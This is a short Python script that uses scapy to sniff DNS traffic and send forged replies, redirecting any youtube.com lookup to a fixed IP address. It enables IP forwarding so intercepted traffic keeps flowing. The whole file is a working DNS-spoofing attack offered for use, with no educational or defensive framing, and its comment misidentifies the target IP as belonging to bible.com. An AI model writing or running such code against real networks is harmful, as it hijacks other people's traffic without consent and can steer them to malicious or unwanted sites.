from scapy.all import *
import os

# Function to enable IP forwarding
def enable_ip_forwarding():
    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")

# Function to disable IP forwarding
def disable_ip_forwarding():
    os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")

# Function to spoof DNS response
def dns_response(packet):
    if packet.haslayer(DNSQR) and b"youtube.com" in packet[DNSQR].qname:
        spoofed_pkt = IP(dst=packet[IP].src, src=packet[IP].dst) / \
                      UDP(dport=packet[UDP].sport, sport=packet[UDP].dport) / \
                      DNS(id=packet[DNS].id, qr=1, aa=1, qd=packet[DNS].qd,
                          an=DNSRR(rrname=packet[DNS].qd.qname, ttl=10, rdata="93.184.216.34"))  # bible.com IP
        send(spoofed_pkt, verbose=0)
        print(f"Spoofed DNS response sent to {packet[IP].src} for {packet[DNS].qd.qname.decode('utf-8')}")

# Main function to start DNS spoofing
def start_spoofing():
    enable_ip_forwarding()
    print("Starting DNS spoofing... Press Ctrl+C to stop.")
    try:
        sniff(filter="udp port 53", prn=dns_response, store=0)
    except KeyboardInterrupt:
        print("DNS spoofing stopped.")
    finally:
        disable_ip_forwarding()

if __name__ == "__main__":
    start_spoofing()
